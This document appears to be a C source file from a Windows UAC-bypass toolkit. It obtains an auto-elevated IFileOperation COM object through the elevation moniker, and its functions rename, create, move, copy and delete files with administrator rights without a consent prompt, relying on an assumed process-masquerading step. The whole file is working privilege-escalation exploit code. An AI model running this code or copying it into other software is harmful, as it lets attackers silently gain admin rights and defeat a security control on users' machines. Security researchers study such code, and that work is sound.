/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2019
*
*  TITLE:       COMSUP.C
*
*  VERSION:     3.17
*
*  DATE:        16 Mar 2019
*
*  IFileOperation based routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmAllocateElevatedObject
*
* Purpose:
*
* CoGetObject elevation as admin.
*
*/
HRESULT ucmAllocateElevatedObject(
    _In_ LPWSTR lpObjectCLSID,
    _In_ REFIID riid,
    _In_ DWORD dwClassContext,
    _Outptr_ void **ppv
)
{
    BOOL        bCond = FALSE;
    DWORD       classContext;
    HRESULT     hr = E_FAIL;
    PVOID       ElevatedObject = NULL;

    /*
    CLSID       xCLSID;
    IUnknown   *IBase;
    */

    BIND_OPTS3  bop;
    WCHAR       szMoniker[MAX_PATH];

    do {

        if (_strlen(lpObjectCLSID) > 64)
            break;

        /*
        if (NOERROR == CLSIDFromString(
            lpObjectCLSID,
            &xCLSID))
        {
            hr = CoCreateInstance(
                &xCLSID,
                NULL,
                CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER,
                riid,
                &IBase);

            if (hr == S_OK) {
                IBase->lpVtbl->Release(IBase);
            }
        }
        */

        RtlSecureZeroMemory(&bop, sizeof(bop));
        bop.cbStruct = sizeof(bop);

        classContext = dwClassContext;
        if (dwClassContext == 0)
            classContext = CLSCTX_LOCAL_SERVER;

        bop.dwClassContext = classContext;

        _strcpy(szMoniker, T_ELEVATION_MONIKER_ADMIN);
        _strcat(szMoniker, lpObjectCLSID);

        hr = CoGetObject(szMoniker, (BIND_OPTS *)&bop, riid, &ElevatedObject);

    } while (bCond);

    *ppv = ElevatedObject;

    return hr;
}

/*
* ucmxFileOpCreateAndRelease
*
* Purpose:
*
* Test create new instance IFileOperation.
*
*/
VOID ucmxFileOpCreateAndRelease(VOID)
{
    IFileOperation *FileOperation = NULL;

    if (S_OK != CoCreateInstance(
        &CLSID_FileOperation,
        NULL,
        CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER,
        &IID_IFileOperation,
        &FileOperation))
    {
        return;
    }

    if (FileOperation != NULL) {
        FileOperation->lpVtbl->Release(FileOperation);
    }
}

/*
* ucmMasqueradedRenameElementCOM
*
* Purpose:
*
* Rename file/directory autoelevated.
* This function expects that supMasqueradeProcess was called on process initialization.
*
*/
BOOL ucmMasqueradedRenameElementCOM(
    _In_ LPWSTR OldName,
    _In_ LPWSTR NewName
)
{
    BOOL                bCond = FALSE, bResult = FALSE;
    IFileOperation     *FileOperation = NULL;
    IShellItem         *psiDestDir = NULL;
    HRESULT             hr_init;

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {

        //ucmxFileOpCreateAndRelease();

        if (S_OK != ucmAllocateElevatedObject(
            T_CLSID_FileOperation,
            &IID_IFileOperation,
            CLSCTX_LOCAL_SERVER,
            &FileOperation))
        {
            break;
        }

        if (FileOperation == NULL) {
            break;
        }

        if (S_OK != FileOperation->lpVtbl->SetOperationFlags(
            FileOperation,
            g_ctx->IFileOperationFlags))
        {
            break;
        }

        if (S_OK != SHCreateItemFromParsingName(
            OldName,
            NULL,
            &IID_IShellItem,
            &psiDestDir))
        {
            break;
        }

        if (S_OK != FileOperation->lpVtbl->RenameItem(
            FileOperation,
            psiDestDir,
            NewName,
            NULL))
        {
            break;
        }

        if (S_OK != FileOperation->lpVtbl->PerformOperations(
            FileOperation))
        {
            break;
        }

        psiDestDir->lpVtbl->Release(psiDestDir);
        psiDestDir = NULL;

        bResult = TRUE;

    } while (bCond);

    if (FileOperation != NULL) {
        FileOperation->lpVtbl->Release(FileOperation);
    }

    if (psiDestDir != NULL) {
        psiDestDir->lpVtbl->Release(psiDestDir);
    }

    if (hr_init == S_OK)
        CoUninitialize();

    return bResult;
}

/*
* ucmMasqueradedCreateSubDirectoryCOM
*
* Purpose:
*
* Create directory autoelevated.
* This function expects that supMasqueradeProcess was called on process initialization.
*
*/
BOOL ucmMasqueradedCreateSubDirectoryCOM(
    _In_ LPWSTR ParentDirectory,
    _In_ LPWSTR SubDirectory
)
{
    BOOL                bCond = FALSE, bResult = FALSE;
    IFileOperation     *FileOperation = NULL;
    IShellItem         *psiDestDir = NULL;
    HRESULT             hr_init;

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {

        //ucmxFileOpCreateAndRelease();

        if (S_OK != ucmAllocateElevatedObject(
            T_CLSID_FileOperation,
            &IID_IFileOperation,
            CLSCTX_LOCAL_SERVER,
            &FileOperation))
        {
            break;
        }

        if (FileOperation == NULL) {
            break;
        }

        if (S_OK != FileOperation->lpVtbl->SetOperationFlags(
            FileOperation,
            g_ctx->IFileOperationFlags))
        {
            break;
        }

        if (S_OK != SHCreateItemFromParsingName(
            ParentDirectory,
            NULL,
            &IID_IShellItem,
            &psiDestDir))
        {
            break;
        }

        if (S_OK != FileOperation->lpVtbl->NewItem(
            FileOperation,
            psiDestDir,
            FILE_ATTRIBUTE_DIRECTORY,
            SubDirectory,
            NULL,
            NULL))
        {
            break;
        }

        if (S_OK != FileOperation->lpVtbl->PerformOperations(
            FileOperation))
        {
            break;
        }

        psiDestDir->lpVtbl->Release(psiDestDir);
        psiDestDir = NULL;

        bResult = TRUE;

    } while (bCond);

    if (FileOperation != NULL) {
        FileOperation->lpVtbl->Release(FileOperation);
    }

    if (psiDestDir != NULL) {
        psiDestDir->lpVtbl->Release(psiDestDir);
    }

    if (hr_init == S_OK)
        CoUninitialize();

    return bResult;
}

/*
* ucmMasqueradedMoveCopyFileCOM
*
* Purpose:
*
* Move or Copy file autoelevated.
* This function expects that supMasqueradeProcess was called on process initialization.
*
*/
BOOL ucmMasqueradedMoveCopyFileCOM(
    _In_ LPWSTR SourceFileName,
    _In_ LPWSTR DestinationDir,
    _In_ BOOL fMove
)
{
    BOOL                cond = FALSE, bResult = FALSE;
    IFileOperation     *FileOperation = NULL;
    IShellItem         *isrc = NULL, *idst = NULL;
    HRESULT             r = E_FAIL, hr_init;

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {

        //ucmxFileOpCreateAndRelease();

        if (S_OK != ucmAllocateElevatedObject(
            T_CLSID_FileOperation,
            &IID_IFileOperation,
            CLSCTX_LOCAL_SERVER,
            &FileOperation))
        {
            break;
        }

        if (FileOperation == NULL) {
            break;
        }

        if (S_OK != FileOperation->lpVtbl->SetOperationFlags(
            FileOperation,
            g_ctx->IFileOperationFlags))
        {
            break;
        }

        if (S_OK != SHCreateItemFromParsingName(
            SourceFileName,
            NULL,
            &IID_IShellItem,
            &isrc))
        {
            break;
        }

        if (S_OK != SHCreateItemFromParsingName(
            DestinationDir,
            NULL,
            &IID_IShellItem,
            &idst))
        {
            break;
        }

        if (fMove) {
            r = FileOperation->lpVtbl->MoveItem(
                FileOperation,
                isrc,
                idst,
                NULL,
                NULL);
        }
        else {
            r = FileOperation->lpVtbl->CopyItem(
                FileOperation,
                isrc,
                idst,
                NULL,
                NULL);
        }

        if (r != S_OK)
            break;

        if (S_OK != FileOperation->lpVtbl->PerformOperations(
            FileOperation))
        {
            break;
        }

        idst->lpVtbl->Release(idst);
        idst = NULL;
        isrc->lpVtbl->Release(isrc);
        isrc = NULL;

        bResult = TRUE;

    } while (cond);

    if (FileOperation != NULL)
        FileOperation->lpVtbl->Release(FileOperation);

    if (isrc != NULL)
        isrc->lpVtbl->Release(isrc);

    if (idst != NULL)
        idst->lpVtbl->Release(idst);

    if (hr_init == S_OK)
        CoUninitialize();

    return bResult;
}

/*
* ucmMasqueradedDeleteDirectoryFileCOM
*
* Purpose:
*
* Delete directory or file autoelevated.
* This function expects that supMasqueradeProcess was called on process initialization.
*
*/
BOOL ucmMasqueradedDeleteDirectoryFileCOM(
    _In_ LPWSTR FileName
)
{
    BOOL                cond = FALSE, bResult = FALSE;
    IFileOperation     *FileOperation = NULL;
    IShellItem         *isrc = NULL;
    HRESULT             r = E_FAIL, hr_init;

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {

        //ucmxFileOpCreateAndRelease();

        if (S_OK != ucmAllocateElevatedObject(
            T_CLSID_FileOperation,
            &IID_IFileOperation,
            CLSCTX_LOCAL_SERVER,
            &FileOperation))
        {
            break;
        }

        if (FileOperation == NULL) {
            break;
        }

        if (S_OK != FileOperation->lpVtbl->SetOperationFlags(
            FileOperation,
            g_ctx->IFileOperationFlags))
        {
            break;
        }

        if (S_OK != SHCreateItemFromParsingName(
            FileName,
            NULL,
            &IID_IShellItem,
            &isrc))
        {
            break;
        }

        r = FileOperation->lpVtbl->DeleteItem(
            FileOperation,
            isrc,
            NULL);

        if (r != S_OK)
            break;

        if (S_OK != FileOperation->lpVtbl->PerformOperations(
            FileOperation))
        {
            break;
        }

        isrc->lpVtbl->Release(isrc);
        isrc = NULL;

        bResult = TRUE;

    } while (cond);

    if (FileOperation != NULL)
        FileOperation->lpVtbl->Release(FileOperation);

    if (isrc != NULL)
        isrc->lpVtbl->Release(isrc);

    if (hr_init == S_OK)
        CoUninitialize();

#ifdef _DEBUG
    if (bResult) {
        OutputDebugString(FileName);
        OutputDebugString(TEXT("\r\nCleanup success\r\n"));
    }
    else {
        OutputDebugString(TEXT("\r\nCleanup failed\r\n"));
    }
#endif

    return bResult;
}

/*
* ucmMasqueradedMoveFileCOM
*
* Purpose:
*
* Move file autoelevated.
* This function expects that supMasqueradeProcess was called on process initialization.
*
*/
BOOL ucmMasqueradedMoveFileCOM(
    _In_ LPWSTR SourceFileName,
    _In_ LPWSTR DestinationDir
)
{
    return ucmMasqueradedMoveCopyFileCOM(
        SourceFileName,
        DestinationDir,
        TRUE);
}
